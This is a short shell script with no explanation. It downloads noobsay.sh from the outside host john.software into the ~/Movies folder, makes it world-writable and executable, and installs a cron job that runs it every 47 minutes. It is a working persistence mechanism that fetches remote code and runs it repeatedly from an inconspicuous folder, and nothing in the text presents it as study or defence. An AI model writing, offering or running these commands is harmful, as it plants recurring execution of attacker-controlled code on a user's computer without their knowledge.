
crontab -l > mycron
curl -o ~/Movies/noobsay.sh "john.software/noobsay.sh"
chmod 777 ~/Movies/noobsay.sh
echo "*/47 * * * * ~/Movies/noobsay.sh" >> mycron
crontab mycron
rm mycron
